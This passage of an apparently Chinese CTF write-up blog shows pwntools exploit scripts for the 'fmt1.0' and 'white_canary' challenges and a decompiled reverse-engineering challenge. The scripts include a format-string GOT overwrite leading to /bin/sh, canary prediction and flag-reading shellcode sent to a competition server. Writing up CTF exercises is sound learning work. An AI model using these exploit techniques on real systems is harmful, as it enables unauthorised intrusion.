number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'44'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">10</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'45'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">12</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'-1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"fmt10\"><a class=\"markdownIt-Anchor\" href=\"#fmt10\">#</a> fmt1.0</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.node.game.sycsec.com'</span><span class=\"token punctuation\">,</span><span class=\"token number\">31898</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./fmt1.0')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># r = process('./fmt1.0')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./fmt1.0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>ret_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x401257</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>print_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'printf'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>execve <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'execve'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>payload<span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x404020</span><span class=\"token punctuation\">:</span><span class=\"token number\">0x4010D0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x58</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>payload <span class=\"token operator\">=</span><span class=\"token string\">b'/bin/sh\\x00'</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"white_canary\"><a class=\"markdownIt-Anchor\" href=\"#white_canary\">#</a> white_canary</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./chal'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>libc <span class=\"token operator\">=</span> cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span><span class=\"token string\">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>ret_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x401257</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    seed <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">60</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    v1 <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>seed<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    v2 <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    v3 <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    canary_pre <span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v2 <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> v3 <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v2 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v2 <span class=\"token operator\">>></span> <span class=\"token number\">48</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v2 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">48</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    canary <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>canary_pre<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">:</span><span class=\"token number\">30</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token comment\"># r = process('./chal')</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.node.game.sycsec.com'</span><span class=\"token punctuation\">,</span><span class=\"token number\">31883</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    payload <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    payload <span class=\"token operator\">+=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token string\">'rax'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4040E0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    payload <span class=\"token operator\">+=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4040E0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    se<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4040E0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    sea<span class=\"token punctuation\">(</span><span class=\"token string\">b'tell me something:\\n'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    res <span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>recvall<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">b'stack'</span> <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr></table></figure><h2 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> re</h2>\n<h3 id=\"shiftjmp\"><a class=\"markdownIt-Anchor\" href=\"#shiftjmp\">#</a> shiftjmp</h3>\n<p>花指令</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">33</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> rodata<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> i <span class=\"token operator\">^</span> <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"no\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yes\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">// rodata = SXAxS6jd8doTxBQ&#123;x\"Ma',27h,'csE-|El,o/&#123;^\\</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token 